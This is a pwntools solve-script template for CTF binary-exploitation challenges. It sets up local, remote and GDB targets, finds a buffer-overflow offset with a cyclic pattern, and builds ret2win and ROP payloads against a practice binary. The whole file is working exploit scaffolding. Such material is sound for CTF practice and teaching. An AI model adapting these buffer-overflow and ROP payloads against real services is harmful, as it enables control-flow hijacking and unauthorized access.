#!/usr/bin/env python3
"""
Universal Pwntools Template for CTF Pwn Challenges.
Usage:
    python3 solve.py               # Runs locally against ./vuln
    python3 solve.py REMOTE        # Runs against remote server
    python3 solve.py GDB           # Attaches GDB to local process
"""

from pwn import *

# ==============================================================================
# CONFIGURATION
# ==============================================================================
exe = './vuln'
host = '127.0.0.1'
port = 1337

elf = context.binary = ELF(exe, checksec=False)
context.terminal = ['tmux', 'splitw', '-h'] # or ['x-terminal-emulator', '-e']
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote(host, port)
    elif args.GDB:
        # Script commands to run in GDB on attach
        gdbscript = '''
        init-pwndbg
        break main
        continue
        '''
        return gdb.debug([exe], gdbscript=gdbscript)
    else:
        return process([exe])

io = start()

# ==============================================================================
# HELPER: FIND OFFSET USING CYCLIC PATTERN
# ==============================================================================
# In terminal:
#   cyclic 100
# Run program in GDB, input cyclic string, inspect crash address ($rsp or $eip):
#   cyclic -l 0x61616161 (or 4 bytes string 'caaa')
# Set offset below:
offset = 40

# ==============================================================================
# EXPLOIT PAYLOAD CONSTRUCTION
# ==============================================================================

# Scenario A: ret2win (Function that gives flag exists, e.g., 'win' or 'print_flag')
win_addr = elf.symbols['win']
log.info(f"Target win address: {hex(win_addr)}")

# On 64-bit Ubuntu (GLIBC 2.27+), MOVAPS requires stack aligned to 16 bytes.
# If exploit crashes inside system() or do_system(), insert a dummy 'ret' gadget!
ret_gadget = (elf.search(asm('ret'))).__next__()

# 64-bit payload:
payload = flat({
    offset: [
        ret_gadget,   # Stack alignment fix (if needed for 64-bit)
        win_addr      # Address of win function
    ]
})

# Scenario B: 64-bit function with arguments (e.g. win(0xdeadbeef, 0xcafebabe))
# In x86_64: Args go in RDI, RSI, RDX, RCX, R8, R9
# rop = ROP(elf)
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
# payload = flat({
#     offset: [
#         pop_rdi,
#         0xdeadbeef,
#         win_addr
#     ]
# })

# ==============================================================================
# SEND PAYLOAD & INTERACT
# ==============================================================================
io.sendlineafter(b':', payload) # Wait for prompt and send
# io.sendline(payload)

io.interactive()
